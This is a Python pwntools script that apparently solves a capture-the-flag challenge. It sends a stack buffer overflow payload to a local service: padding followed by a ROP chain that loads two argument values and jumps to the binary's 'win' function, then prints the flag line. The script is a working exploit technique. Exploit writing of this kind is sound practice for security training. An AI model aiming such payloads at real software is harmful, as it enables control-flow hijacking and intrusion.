from pwn import *
import sys 
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

filename = "./bin/chal"

elf = ELF(filename)

flag_format = "flag"

context.binary = elf

#r = process(filename)
r = remote("127.0.0.1", 3004)

rop = ROP(elf)

win = elf.sym["win"]
print("win @ " + hex(win))

pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (rop.find_gadget(['pop rsi', 'ret']))[0]

#rop.call(win, [0xdeadbeef, 0xcafebabe])

payload  = b"A" * 136
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(0xcafebabe)
payload += p64(win)

r.sendline(payload)
print(r.recvline_contains(b"TSRY").decode())
